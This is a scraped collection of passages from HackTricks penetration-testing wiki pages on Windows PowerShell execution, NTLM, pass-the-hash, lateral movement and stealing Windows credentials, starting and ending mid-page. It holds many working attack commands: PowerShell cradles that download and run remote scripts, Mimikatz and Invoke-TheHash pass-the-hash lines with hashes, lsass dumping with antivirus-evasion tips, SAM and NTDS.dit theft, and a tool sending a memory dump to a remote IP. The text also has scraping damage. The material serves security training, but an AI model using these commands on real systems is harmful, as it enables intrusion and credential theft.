execute:\npowershell\n-\nnop\n-\nc\n\"iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')\"\n8¬∫ Use command\nswitch\nPowershell\n-\ncommand\n\"Write-Host 'My voice is my passport, verify me.'\"\n9¬∫ Use EncodeCommand\n$command\n=\n\"Write-Host 'My voice is my passport, verify me.'\"\n$bytes\n=\n[System.Text.Encoding]\n::Unicode\n.\nGetBytes\n(\n$command\n)\n$encodedCommand\n=\n[Convert]\n::ToBase64String\n(\n$bytes\n)\npowershell\n.\nexe\n-\nEncodedCommand\n$encodedCommand\nMore can be found\nhere\n‚Äã\nSecurity Support Provider Interface (SSPI)\nIs the API that can be use to authenticate users.\nThe SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.\nMain SSPs\nKerberos\n: The preferred one\n%windir%\\Windows\\System32\\kerberos.dll\nNTLMv1\nand\nNTLMv2\n: Compatibility reasons\n%windir%\\Windows\\System32\\msv1_0.dll\nDigest\n: Web servers and LDAP, password in form of a MD5 hash\n%windir%\\Windows\\System32\\Wdigest.dll\nSchannel\n: SSL and TLS\n%windir%\\Windows\\System32\\Schannel.dll\nNegotiate\n: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)\n%windir%\\Windows\\System32\\lsasrv.dll\nThe negotiation could offer several methods or only one.\nUAC - User Account Control\n‚Äã\nUser Account Control (UAC)\nis a feature that enables a\nconsent prompt for elevated activities\n.\nUAC - User Account Control\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch \u0000\u0000\u0000üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nUnconstrained Delegation\nNext\nUAC - User Account Control\nLast modified\n2mo ago"
    },
    {
        "title": "NTLM",
        "url": "https://book.hacktricks.xyz/windows-hardening/ntlm",
        "text": "NTLM\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nNTLM Credentials\n: Domain name (if any), username and password hash.\nLM\nis only\nenabled\nin\nWindows XP and server 2003\n(LM hashes can be cracked). The LM hash AAD3B435B51404EEAAD3B435B51404EE means that LM is not being used (is the LM hash of empty string).\nBy default\nKerberos\nis\nused\n, so NTLM will only be used if\nthere isn't any Active Directory configured,\nthe\nDomain doesn't exist\n,\nKerberos isn't working\n(bad configuration) or the\nclient\nthat tries to connect using the IP instead of a valid host-name.\nThe\nnetwork packets\nof a\nNTLM authentication\nhave the\nheader\n\"\nNTLMSSP\n\".\nThe protocols: LM, NTLMv1 and NTLMv2 are supported in the DLL %windir%\\Windows\\System32\\msv1_0.dll\nLM, NTLMv1 and NTLMv2\nYou can check and configure which protocol will be used:\nGUI\nExecute\nsecpol.msc\n-> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).\nRegistry\nThis will set the level 5:\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f\nPossible values:\n0 - Send LM & NTLM responses\n1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated\n2 - Send NTLM response only\n3 - Send NTLMv2 response only\n4 - Send NTLMv2 response only, refuse LM\n5 - Send NTLMv2 response only, refuse LM & NTLM\nBasic NTLM Domain authentication Scheme\n1.\nThe\nuser\nintroduces his\ncredentials\n2.\nThe client machine\nsends an authentication request\nsending the\ndomain name\nand the\nusername\n3.\nThe\nserver\nsends the\nchallenge\n4.\nThe\nclient encrypts\nthe\nchallenge\nusing the hash of the password as key and sends it as response\n5.\nThe\nserver sends\nto the\nDomain controller\nthe\ndomain name, the username, the challenge and the response\n. If there\nisn't\nan Active Directory configured or the domain name is the name of the server, the credentials are\nchecked locally\n.\n6.\nThe\ndomain controller checks if everything is correct\nand sends the information to the server\nThe\nserver\nand the\nDomain Controller\nare able to create a\nSecure Channel\nvia\nNetlogon\nserver as the Domain Controller know the password of the server (it is inside the\nNTDS.DIT\ndb).\nLocal NTLM authentication Scheme\nThe authentication is as the one mentioned\nbefore but\nthe\nserver\nknows the\nhash of the user\nthat tries to authenticate inside the\nSAM\nfile. So, instead of asking the Domain Controller, the\nserver will check itself\nif the user can authenticate.\nNTLMv1 Challenge\nThe\nchallenge length is 8 bytes\nand the\nresponse is 24 bytes\nlong.\nThe\nhash NT (16bytes)\nis divided in\n3 parts of 7bytes each\n(7B + 7B + (2B+0x00*5)): the\nlast part is filled with zeros\n. Then, the\nchallenge\nis\nciphered separately\nwith each part and the\nresulting\nciphered bytes are\njoined\n. Total: 8B + 8B + 8B = 24Bytes.\nProblems\n:\nLack of\nrandomness\nThe 3 parts can be\nattacked separately\nto find the NT hash\nDES is crackable\nThe 3¬∫ key is composed always by\n5 zeros\n.\nGiven the\nsame challenge\nthe\nresponse\nwill be\nsame\n. So, you can give as a\nchallenge\nto the victim the string \"\n1122334455667788\n\" and attack the response used\nprecomputed rainbow tables\n.\nNTLMv1 attack\nNowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't\nabuse a Print Spooler service\nconfigured.\nYou could abuse some credentials/sessions you already have on the AD to\nask the printer to authenticate\nagainst some\nhost under your control\n. Then, using\nmetasploit auxiliary/server/capture/smb\nor\nresponder\nyou can\nset the authentication challenge to 1122334455667788\n, capture the authentication attempt, and if it was done using\nNTLMv1\nyou will be able to\ncrack it\n.\nIf you are using\nresponder\nyou could try to **use the flag\n--lm\n** to try to\ndowngrade\nthe\nauthentication\n.\nNote that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid).\nRemember that the printer will use the computer account during the authentication, and computer accounts use\nlong and random passwords\nthat you\nprobably won't be able to crack\nusing common\ndictionaries\n. But the\nNTLMv1\nauthentication\nuses DES\n(\nmore info here\n), so using some services specially dedicated to cracking DES you will be able to crack it (you could use\nhttps://crack.sh/\nfor example).\nNTLMv2 Challenge\nThe\nchallenge length is 8 bytes\nand\n2 responses are sent\n: One is\n24 bytes\nlong and the length of the\nother\nis\nvariable\n.\nThe first response\nis created by ciphering using\nHMAC_MD5\nthe\nstring\ncomposed by the\nclient and the domain\nand using as\nkey\nthe\nhash MD4\nof the\nNT hash\n. Then, the\nresult\nwill by used as\nkey\nto cipher using\nHMAC_MD5\nthe\nchallenge\n. To this,\na client challenge of 8 bytes will be added\n. Total: 24 B.\nThe\nsecond response\nis created using\nseveral values\n(a new client challenge, a\ntimestamp\nto avoid\nreplay attacks\n...)\nIf you have a\npcap that has captured a successful authentication process\n, you can follow this guide to get the domain, username , challenge and response and try to creak the password:\nhttps://research.801labs.org/cracking-an-ntlmv2-hash/\n‚Äã\nPass-the-Hash\nOnce you have the hash of the victim\n, you can use it to\nimpersonate\nit.\nYou need to use a\ntool\nthat will\nperform\nthe\nNTLM authentication using\nthat\nhash\n,\nor\nyou could create a new\nsessionlogon\nand\ninject\nthat\nhash\ninside the\nLSASS\n, so when any\nNTLM authentication is performed\n, that\nhash will be used.\nThe last option is what mimikatz does.\nPlease, remember that you can perform Pass-the-Hash attacks also using Computer accounts.\nMimikatz\nNeeds to be run as administrator\nInvoke-Mimikatz\n-Command\n'\"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe\"'\nThis will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the\nrunas /netonly\ntrick but you don't need to know the plain-text password).\nPass-the-Hash from linux\nYou can obtain code execution in Windows machines using Pass-the-Hash from Linux.\nAccess here to learn how to do it.\n‚Äã\nImpacket Windows compiled tools\nYou can download\nimpacket binaries for Windows here\n.\npsexec_windows.exe\nC:\\AD\\MyTools\\psexec_windows.exe -hashes \":b38ff50264b74508085d82c69794a4d8\"\n[email¬†protected]\nwmiexec.exe\nwmiexec_windows.exe -hashes \":b38ff50264b74508085d82c69794a4d8\"\n[email¬†protected]\natexec.exe\n(In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)\nC:\\AD\\MyTools\\atexec_windows.exe -hashes \":b38ff50264b74508085d82c69794a4d8\" s\n[email¬†protected]\n'whoami'\nThere are several more Impacket binaries...\nInvoke-TheHash\nYou can get the powershell scripts from here:\nhttps://github.com/Kevin-Robertson/Invoke-TheHash\n‚Äã\nInvoke-SMBExec\nInvoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command \"iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)\"' -verbose\nInvoke-WMIExec\nInvoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command \"iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)\"' -verbose\nInvoke-SMBClient\nInvoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\\\dcorp-mgmt.my.domain.local\\C$\\ -verbose\nInvoke-SMBEnum\nInvoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose\nInvoke-TheHash\nThis function is a\nmix of all the others\n. You can pass\nseveral hosts\n,\nexclude\nsomeones and\nselect\nthe\noption\nyou want to use (\nSMBExec, WMIExec, SMBClient, SMBEnum\n). If you select\nany\nof\nSMBExec\nand\nWMIExec\nbut you\ndon't\ngive any\nCommand\nparameter it will just\ncheck\nif you have\nenough permissions\n.\nInvoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0\n‚Äã\nEvil-WinRM Pass the Hash\n‚Äã\nWindows Credentials Editor (WCE)\nNeeds to be run as administrator\nThis tool will do the same thing as mimikatz (modify LSASS memory).\nwce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>\nManual Windows remote execution with username and password\nLateral Movement\nExtracting credentials from a Windows Host\nFor more information about\nhow to obtain credentials from a Windows host you should read this page\n.\nNTLM Relay and Responder\nRead more detailed guide on how to perform those attacks here:\nSpoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks\nParse NTLM challenges from a network capture\nYou can use\nhttps://github.com/mlgualtieri/NTLMRawUnHide\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nUAC - User Account Control\nNext\nPlaces to steal NTLM creds\nLast modified\n6mo ago"
    },
    {
        "title": "Lateral Movement",
        "url": "https://book.hacktricks.xyz/windows-hardening/lateral-movement",
        "text": "Lateral Movement\n‚Äã\n\u0000\u0000‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nThere are different different ways to execute commands in external systems, here you can find the explanations on how the main Windows lateral movements techniques work:\n‚Äã\nPsExec\n‚Äã\n‚Äã\nSmbExec\n‚Äã\n‚Äã\nWmicExec\n‚Äã\n‚Äã\nAtExec / SchtasksExec\n‚Äã\n‚Äã\nWinRM\n‚Äã\n‚Äã\nDCOM Exec\n‚Äã\n****\nPass the cookie\n**** (cloud)\n****\nPass the PRT\n**** (cloud)\n‚Äã\nPass the AzureAD Certificate\n(cloud)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nPlaces to steal NTLM creds\nNext\nAtExec / SchtasksExec\nLast modified\n6mo ago"
    },
    {
        "title": "Pivoting to the Cloud",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-lateral-movements",
        "text": "Az - Lateral Movement (Cloud - On-Prem)\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nOn-Prem machines connected to cloud\nThere are different ways a machine can be connected to the cloud:\nAzure AD joined\nWorkplace joined\n‚Äã\nhttps://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large\n‚Äã\nHybrid joined\n‚Äã\nhttps://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large\n‚Äã\nWorkplace joined on AADJ or Hybrid\n‚Äã\nhttps://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large\n‚Äã\nPivoting Techniques\nFrom the\ncompromised machine to the cloud\n:\n‚Äã\nPass the Cookie\n‚Äã\n‚Äã\nPass the PRT\n‚Äã\n‚Äã\nPass the Certificate\n‚Äã\nFrom compromising\nAD\nto compromising the\nCloud\nand from compromising the\nCloud to\ncompromising\nAD\n:\n‚Äã\nAzure AD Connect\n‚Äã\nAnother way to pivot from could to On-Prem is\nabusing Intune\n‚Äã\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nAz - Permissions for a Pentest\nNext\nAz - Pass the Cookie\nLast modified\n1yr ago"
    },
    {
        "title": "Stealing Windows Credentials",
        "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials",
        "text": "Stealing Windows Credentials\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCredentials Mimikatz\n#Elevate Privileges to extract the credentials\nprivilege::debug\n#This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins\ntoken::elevate\n#Extract from lsass (memory)\nsekurlsa::logonpasswords\n#Extract from lsass (service)\nlsadump::lsa /inject\n#Extract from SAM\nlsadump::sam\n#One liner\nmimikatz\n\"privilege::debug\"\n\"token::elevate\"\n\"sekurlsa::logonpasswords\"\n\"lsadump::lsa /inject\"\n\"lsadump::sam\"\n\"lsadump::cache\"\n\"sekurlsa::ekeys\"\n\"exit\"\nFind other things that Mimikatz can do in\nthis page\n.\nInvoke-Mimikatz\nIEX\n(\nNew-Object System.Net.Webclient\n)\n.DownloadString\n(\n'https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'\n)\nInvoke-Mimikatz\n-DumpCreds\n#Dump creds from memory\nInvoke-Mimikatz\n-Command\n'\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::lsa /inject\" \"lsadump::sam\" \"lsadump::cache\" \"sekurlsa::ekeys\" \"exit\"'\n‚Äã\nLearn about some possible credentials protections here.\nThis protections could prevent Mimikatz from extracting some credentials.\nCredentials with Meterpreter\nUse the\nCredentials Plugin\nthat\nI have created to\nsearch for passwords and hashes\ninside the victim.\n#Credentials from SAM\npost/windows/gather/smart_hashdump\nhashdump\n‚Äã\n#Using kiwi module\nload kiwi\ncreds_all\nkiwi_cmd\n\"privilege::debug\"\n\"token::elevate\"\n\"sekurlsa::logonpasswords\"\n\"lsadump::lsa /inject\"\n\"lsadump::sam\"\n‚Äã\n#Using Mimikatz module\nload mimikatz\nmimikatz_command\n-f\n\"sekurlsa::logonpasswords\"\nmimikatz_command\n-f\n\"lsadump::lsa /inject\"\nmimikatz_command\n-f\n\"lsadump::sam\"\nBypassing AV\nProcdump + Mimikatz\nAs\nProcdump from\nSysInternals\nis a legitimate Microsoft tool\n, it's not detected by Defender.\nYou can use this tool to\ndump the lsass process\n,\ndownload the dump\nand\nextract\nthe\ncredentials locally\nfrom the dump.\nDump lsass\n#Local\nC:\n\\\nprocdump.exe\n-accepteula\n-ma\nlsass.exe lsass.dmp\n#Remote, mount https://live.sysinternals.com which contains procdump.exe\nnet use Z: https://live.sysinternals.com\nZ:\n\\\nprocdump.exe\n-accepteula\n-ma\nlsass.exe lsass.dmp\nExtract credentials from the dump\n//Load the dump\nmimikatz # sekurlsa\n::\nminidump lsass\n.\ndmp\n//Extract credentials\nmimikatz # sekurlsa\n::\nlogonPasswords\nThis process is done automatically with\nSprayKatz\n:\n./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24\nNote\n: Some\nAV\nmay\ndetect\nas\nmalicious\nthe use of\nprocdump.exe to dump lsass.exe\n, this is because they are\ndetecting\nthe string\n\"procdump.exe\" and \"lsass.exe\"\n. So it is\nstealthier\nto\npass\nas an\nargument\nthe\nPID\nof lsass.exe to procdump\ninstead o\nf the\nname lsass.exe.\nDumping lsass with\ncomsvcs.dll\nThere‚Äôs a DLL called\ncomsvcs.dll\n, located in\nC:\\Windows\\System32\nthat\ndumps process memory\nwhenever they\ncrash\n. This DLL contains a\nfunction\ncalled\nMiniDumpW\nthat is written so it can be called with\nrundll32.exe\n.\nThe first two arguments are not used, but the third one is split into 3 parts. First part is the process ID that will be dumped, second part is the dump file location, and third part is the word\nfull\n. There is no other choice.\nOnce these 3 arguments has been parsed, basically this DLL creates the dump file, and dumps the specified process into that dump file.\nThanks to this function, we can use\ncomsvcs.dll\nto dump lsass process instead of uploading procdump and executing it. (This information was extracted from\nhttps://en.hackndo.com/remote-lsass-dump-passwords/\n)\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass pid> lsass.dmp full\nWe just have to keep in mind that this technique can only be executed as\nSYSTEM\n.\nYou can automate this process with\nlssasy\n.\nDumping lsass with Task Manager\n1.\nRight click on the Task Bar and click on Task Manager\n2.\nClick on More details\n3.\nSearch for \"Local Security Authority Process\" process in the Processes tab\n4.\nRight click on \"Local Security Authority Process\" process and click on \"Create dump file\".\nDumping lsass with procdump\n‚Äã\nProcdump\nis a Microsoft signed binary which is a part of\nsysinternals\nsuite.\nGet-Process -Name LSASS\n.\\procdump.exe -ma 608 lsass.dmp\nDumpin lsass with PPLBlade\n‚Äã\nPPLBlade\nis a Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.\nKey functionalities\n:\n1.\nBypassing PPL protection\n2.\nObfuscating memory dump files to evade Defender signature-based detection mechanisms\n3.\nUploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)\nPPLBlade.exe\n--mode\ndump\n--name\nlsass.exe\n--handle\nprocexp\n--obfuscate\n--dumpmode\nnetwork\n--network\nraw\n--ip\n192.168\n.1.17\n--port\n1234\nCrackMapExec\nDump SAM hashes\ncme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam\nDump LSA secrets\ncme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa\nDump the NTDS.dit from target DC\ncme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds\n#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss\nDump the NTDS.dit password history from target DC\n#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history\nShow the pwdLastSet attribute for each NTDS.dit account\n#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet\nStealing SAM & SYSTEM\nThis files should be\nlocated\nin\nC:\\windows\\system32\\config\\SAM\nand\nC:\\windows\\system32\\config\\SYSTEM.\nBut\nyou cannot just copy them in a regular way\nbecause they protected.\nFrom Registry\nThe easiest way to steal those files is to get a copy from the registry:\nreg save HKLM\\sam sam\nreg save HKLM\\system system\nreg save HKLM\\security security\nDownload\nthose files to your Kali machine and\nextract the hashes\nusing:\nsamdump2 SYSTEM SAM\nimpacket-secretsdump -sam sam -security security -system system LOCAL\nVolume Shadow Copy\nYou can perform copy of protected files using this service. You need to be Administrator.\nUsing vssadmin\nvssadmin binary is only available in Windows Server versions\nvssadmin create shadow /for\n=\nC:\n#Copy SAM\ncopy\n\\\\\n?\n\\\nGLOBALROOT\n\\\nDevice\n\\\nHarddiskVolumeShadowCopy8\n\\\nwindows\n\\\nsystem32\n\\\nconfig\n\\\nSYSTEM C:\n\\\nExtracted\n\\\nSAM\n#Copy SYSTEM\ncopy\n\\\\\n?\n\\\nGLOBALROOT\n\\\nDevice\n\\\nHarddiskVolumeShadowCopy8\n\\\nwindows\n\\\nsystem32\n\\\nconfig\n\\\nSYSTEM C:\n\\\nExtracted\n\\\nSYSTEM\n#Copy ntds.dit\ncopy\n\\\\\n?\n\\\nGLOBALROOT\n\\\nDevice\n\\\nHarddiskVolumeShadowCopy8\n\\\nwindows\n\\\nntds\n\\\nntds.dit C:\n\\\nExtracted\n\\\nntds.dit\n‚Äã\n# You can also create a symlink to the shadow copy and access it\nmklink /d c:\n\\\nshadowcopy\n\\\\\n?\n\\\nGLOBALROOT\n\\\nDevice\n\\\nHarddiskVolumeShadowCopy1\n\\\nBut you can do the same from\nPowershell\n. This is an example of\nhow to copy the SAM file\n(the hard drive used is \"C:\" and its saved to C:\\users\\Public) but you can use this for copying any protected file:\n$service\n=\n(\nGet-Service\n-name\nVSS\n)\nif\n(\n$service\n.Status\n-ne\n\"Running\"\n){\n$notrunning\n=\n1\n;\n$service\n.Start\n()}\n$id\n=\n(\ngwmi\n-list\nwin32_shadowcopy\n)\n.Create\n(\n\"C:\n\\\"\n,\"\nClientAccessible\n\").ShadowID\n$volume\n=(gwmi win32_shadowcopy -filter \"\nID\n=\n'$id'\")\ncmd /c copy \"\n$(\n$volume.DeviceObject\n)\n\\\nwindows\n\\\nsystem32\n\\\nconfig\n\\\nsam\" C:\n\\\nUsers\n\\\nPublic\n$voume\n.Delete\n();\nif\n(\n$notrunning\n-eq\n1\n){\n$service\n.Stop\n()}\nCode from the book:\nhttps://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html\n‚Äã\nInvoke-NinjaCopy\nFinally, you could also use the\nPS script Invoke-NinjaCopy\nto make a copy of SAM, SYSTEM and ntds.dit.\nInvoke-NinjaCopy.ps1\n-Path\n\"C:\\Windows\\System32\n\\c\nonfig\\sam\"\n-LocalDestination\n\"c:\n\\c\nopy_of_local_sam\"\nActive Directory Credentials - NTDS.dit\nThe Ntds.dit file is a database that stores Active Directory data\n, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.\nThe important NTDS.dit file will be\nlocated in\n:\n%SystemRoom%/NTDS/ntds.dit\nThis file is a database\nExtensible Storage Engine\n(ESE) and is \"officially\" composed by 3 tables:\nData Table\n: Contains the information about the objects (users, groups...)\nLink Table\n: Information about the relations (member of...)\nSD Table\n: Contains the security descriptors of each object\nMore information about this:\nhttp://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/\n‚Äã\nWindows uses\nNtdsa.dll\nto interact with that file and its used by\nlsass.exe\n. Then,\npart\nof the\nNTDS.dit\nfile could be located\ninside the\nlsass\nmemory (you can find the latest accessed data probably because of the performance improve by using a\ncache\n).\nDecrypting the hashes inside NTDS.dit\nThe hash is cyphered 3 times:\n1.\nDecrypt Password Encryption Key (\nPEK\n) using the\nBOOTKEY\nand\nRC4\n.\n2.\nDecrypt tha\nhash\nusing\nPEK\nand\nRC4\n.\n3.\nDecrypt the\nhash\nusing\nDES\n.\nPEK\nhave the\nsame value\nin\nevery domain controller\n, but it is\ncyphered\ninside the\nNTDS.dit\nfile using the\nBOOTKEY\nof the\nSYSTEM file of the domain controller (is different between domain controllers)\n. This is why to get the credentials from the NTDS.dit file\nyou need the files NTDS.dit and SYSTEM\n(\nC:\\Windows\\System32\\config\\SYSTEM\n).\nCopying NTDS.dit using Ntdsutil\nAvailable since Windows Server 2008.\nntdsutil\n\"ac i ntds\"\n\"ifm\"\n\"create full c:\n\\c\nopy-ntds\"\nquit quit\nYou could also use the\nvolume shadow copy\ntrick to copy the\nntds.dit\nfile. Remember that you will also need a copy of the\nSYSTEM file\n(again,\ndump it from the registry or use the volume shadow copy\ntrick).\nExtracting hashes from NTDS.dit\nOnce you have\nobtained\nthe files\nNTDS.dit\nand\nSYSTEM\nyou can use tools like\nsecretsdump.py\nto\nextract the hashes\n:\nsecretsdump.py LOCAL\n-ntds\nntds.dit\n-system\nSYSTEM\n-outputfile\ncredentials.txt\nYou can also\nextract them automatically\nusing a valid domain admin user:\nsecretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>\nFor\nbig NTDS.dit files\nit's recommend to extract it using\ngosecretsdump\n.\nFinally, you can also use the\nmetasploit module\n:\npost/windows/gather/credentials/domain_hashdump\nor\nmimikatz\nlsadump::lsa /inject\nExtracting domain objects from NTDS.dit to an SQLite database\nNTDS objects can be extracted to an SQLite database 